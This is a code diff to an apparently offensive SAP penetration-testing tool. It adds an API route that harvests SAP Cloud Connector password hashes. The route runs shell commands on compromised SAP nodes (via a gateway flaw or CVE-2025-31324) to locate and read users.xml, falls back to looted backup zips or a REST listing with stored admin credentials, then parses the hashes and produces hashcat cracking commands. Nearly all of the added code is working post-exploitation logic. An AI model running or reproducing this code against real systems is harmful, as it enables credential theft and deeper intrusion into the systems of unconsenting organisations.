@@ -1751,6 +1751,154 @@ def create_app(api: SAPMAPApi) -> Bottle:
         print(f"[*] SCC {host}: credentials stored for {user}")
         return json.dumps({"ok": True})
 
+    @app.route("/api/scc/<host>/download_user_hashes", method="POST")
+    def scc_download_user_hashes(host):
+        """Read SCC users.xml and return parsed password hashes + hashcat
+        instructions.
+
+        Resolution order:
+          1. On-disk via a co-located pwned SAP node (OS exec)
+          2. From the backup zip already on disk (if not zip-encrypted)
+          3. REST API /api/v1/users (user list only — no hashes; shown as
+             fallback so the operator at least sees who's there)
+        """
+        response.content_type = "application/json"
+        sn = api.state.scc_nodes.get(host)
+        if not sn:
+            return json.dumps({"error": f"SCC node {host} not found"})
+
+        # --- Path 1: co-located pwned SAP node ---------------------------
+        xml_bytes = None
+        xml_source = ""
+        scc_host = sn.ip or sn.host
+        for n in api.state.nodes.values():
+            n_ip = n.ip or n.hostname or ""
+            if n_ip != scc_host:
+                continue
+            if not (n.gw_vulnerable or n.cve_2025_31324_vulnerable
+                    or n.created_users):
+                continue
+            try:
+                from sapmap_exploit import run_os_command
+                # Probe multiple install paths
+                probe_cmd = (
+                    'for d in /opt/sap/scc /usr/local/scc '
+                    '"/opt/SAP/Cloud Connector" /opt/sapscc '
+                    '/opt/cloud-connector; do '
+                    '  if [ -f "$d/config/users.xml" ]; then '
+                    '    echo "USERS_PATH $d/config/users.xml"; break; fi; '
+                    'done'
+                )
+                r = run_os_command(n, "/bin/sh", f"-c '{probe_cmd}'")
+                out = "\n".join(r.get("output") or [])
+                import re as _re
+                m = _re.search(r'USERS_PATH\s+(\S+)', out)
+                if m:
+                    fpath = m.group(1)
+                    cat_cmd = f'cat {fpath} 2>/dev/null'
+                    r2 = run_os_command(n, "/bin/sh", f"-c '{cat_cmd}'")
+                    content = "\n".join(r2.get("output") or [])
+                    if content.strip().startswith("<"):
+                        xml_bytes = content.encode("utf-8", errors="replace")
+                        xml_source = f"on-disk via {n.sid} OS-exec ({fpath})"
+                        print(f"[+] SCC {host}: users.xml read via {n.sid} "
+                              f"({len(xml_bytes)} bytes)")
+                        break
+            except Exception as e:
+                print(f"[-] SCC {host}: OS-exec for users.xml failed: {e}")
+
+        # --- Path 2: backup zip on disk ----------------------------------
+        if not xml_bytes and sn.keystore_loot_path:
+            try:
+                import zipfile as _zf
+                zf = _zf.ZipFile(sn.keystore_loot_path)
+                if "config/users.xml" in zf.namelist():
+                    raw = zf.read("config/users.xml")
+                    if raw[:1] in (b"<", b"\xef"):  # XML or UTF-8 BOM
+                        xml_bytes = raw
+                        xml_source = f"backup zip ({sn.keystore_loot_path})"
+            except Exception:
+                pass
+
+        # --- Path 3: REST API user listing (no hashes) -------------------
+        if not xml_bytes:
+            creds = sn.credentials[0] if sn.credentials else None
+            if creds:
+                try:
+                    from sapmap_scc_admin import login, logout
+                    u = getattr(creds, "username", None) or creds.get("username","")
+                    p = getattr(creds, "password", None) or creds.get("password","")
+                    sess = login(host, u, p, port=sn.admin_ui_port or 8443)
+                    if sess and sess.authenticated:
+                        from sapmap_scc_admin import _request, _basic_headers
+                        import urllib.request as _urlreq
+                        url = f"{sess.base_url}/api/v1/users"
+                        req = _urlreq.Request(url,
+                                             headers=_basic_headers(sess))
+                        with sess.opener.open(req, timeout=8) as r:
+                            body = r.read().decode("utf-8", errors="replace")
+                        logout(sess)
+                        import json as _json2
+                        rest_users = _json2.loads(body) if body.startswith("[") else []
+                        if rest_users:
+                            sapmap_findings.emit_finding(
+                                "INFO", host,
+                                f"SCC users enumerated via REST (no hashes): "
+                                f"{[u.get('name') for u in rest_users]}",
+                                ref="scc.users.rest_listed",
+                                meta={"users": rest_users})
+                            return json.dumps({
+                                "ok": True,
+                                "source": "REST API (no hashes — filesystem access needed for hashes)",
+                                "users": rest_users,
+                                "hashes": [],
+                                "hashcat_commands": [],
+                            })
+                except Exception:
+                    pass
+            return json.dumps({
+                "ok": False,
+                "error": ("users.xml not reachable. Need one of: "
+                          "(a) a co-located pwned SAP node on the same IP, "
+                          "(b) a backup zip already extracted, or "
+                          "(c) stored SCC admin credentials for the REST fallback.")
+            })
+
+        # --- Parse XML ---------------------------------------------------
+        from sapmap_scc_keystore import parse_user_hashes_from_xml
+        result = parse_user_hashes_from_xml(xml_bytes)
+        if not result.get("ok"):
+            return json.dumps(result)
+        users = result["users"]
+        hashcat_cmds = result["hashcat_commands"]
+        for u in users:
+            if u.get("hash_hex"):
+                sapmap_findings.emit_finding(
+                    "HIGH", host,
+                    f"SCC password hash recovered for '{u['username']}' "
+                    f"({u.get('algorithm','?')}, "
+                    f"roles={u.get('roles','?')}) — "
+                    f"hashcat -m {u.get('hashcat_mode',0)} with "
+                    f"hash:salt format.",
+                    ref="scc.users.hash_recovered",
+                    meta={"username": u["username"],
+                          "algorithm": u.get("algorithm"),
+                          "hashcat_mode": u.get("hashcat_mode"),
+                          "roles": u.get("roles")})
+            else:
+                sapmap_findings.emit_finding(
+                    "INFO", host,
+                    f"SCC user '{u['username']}' found in users.xml "
+                    f"(no hash parsed).",
+                    ref="scc.users.no_hash",
+                    meta={"username": u["username"]})
+        return json.dumps({
+            "ok": True,
+            "source": xml_source,
+            "users": users,
+            "hashcat_commands": hashcat_cmds,
+        })
+
     # -- Node operations --
     @app.route("/api/node/<sid>/credentials", method="POST")
     def node_credentials(sid):
